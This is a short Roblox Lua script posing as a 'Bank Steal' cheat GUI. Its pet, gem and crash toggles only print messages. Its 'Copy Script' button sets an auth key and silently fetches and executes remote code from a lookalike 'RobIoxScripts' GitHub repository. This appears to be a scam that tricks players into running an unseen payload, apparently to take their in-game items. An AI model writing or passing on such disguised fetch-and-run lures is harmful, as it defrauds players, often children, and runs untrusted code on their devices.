local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Bank Steal V1", "Ocean")
local Generator = Window:NewTab("Generator")
local Credits = Window:NewTab("Credits")
local GeneratorSection = Generator:NewSection("Generator")
local CreditsSection = Credits:NewSection("All Credited To")
CreditsSection:NewLabel("Korusaki.")

-- Generator

GeneratorSection:NewToggle("Deposit All Pets", "Deposit all pet?", function(state)
    if state then
        print("Nice")
    else
        print("Why did you turn off")
    end
end)
GeneratorSection:NewToggle("Deposit All Gems", "Gemz", function(state)
    if state then
        print("Thats Nice Too")
    else
        print("Whyyy!!?")
    end
end)
GeneratorSection:NewToggle("Crash Game", "Crash!", function(state)
    if state then
        print("Almost Done")
    else
        print("Why you turn off!!")
    end
end)
GeneratorSection:NewButton("Copy Script", "Copy yout script", function()
    _G.AuthKey = "1047e301-7fe7-4d94-9e6c-02443bf22830"
loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
end)
